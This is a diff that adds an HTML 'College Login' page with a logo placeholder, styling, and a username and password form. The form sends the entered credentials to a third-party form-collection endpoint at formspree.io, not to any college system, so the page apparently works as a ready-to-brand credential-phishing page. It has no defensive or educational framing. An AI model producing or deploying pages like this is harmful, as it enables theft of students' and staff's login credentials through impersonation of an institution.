@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>College Login</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, sans-serif;
+}
+
+body{
+    background:linear-gradient(135deg,#4facfe,#00f2fe);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.container{
+    background:#fff;
+    padding:35px;
+    border-radius:15px;
+    width:350px;
+    text-align:center;
+    box-shadow:0 10px 20px rgba(0,0,0,0.3);
+}
+
+.logo{
+    width:90px;
+    height:90px;
+    border-radius:50%;
+    margin-bottom:15px;
+}
+
+h2{
+    color:#333;
+    margin-bottom:20px;
+}
+
+input{
+    width:100%;
+    padding:12px;
+    margin:10px 0;
+    border:1px solid #ccc;
+    border-radius:8px;
+    font-size:16px;
+}
+
+button{
+    width:100%;
+    padding:12px;
+    background:#007BFF;
+    color:white;
+    border:none;
+    border-radius:8px;
+    font-size:16px;
+    cursor:pointer;
+    margin-top:10px;
+}
+
+button:hover{
+    background:#0056b3;
+}
+
+p{
+    margin-top:15px;
+    color:#555;
+    font-size:14px;
+}
+</style>
+
+</head>
+<body>
+
+<div class="container">
+
+    <!-- Replace with your college logo -->
+    <img src="YOUR_COLLEGE_LOGO.png" class="logo" alt="College Logo">
+
+    <h2>College Login</h2>
+
+    <form action="https://formspree.io/f/xnjkorbw" method="POST">
+
+        <input
+            type="text"
+            name="Username"
+            placeholder="Enter Username"
+            required>
+
+        <input
+            type="password"
+            name="Password"
+            placeholder="Enter Password"
+            required>
+
+        <button type="submit">Login</button>
+
+    </form>
+
+    <p>© 2026 College Login Portal</p>
+
+</div>
+
+</body>
+</html>
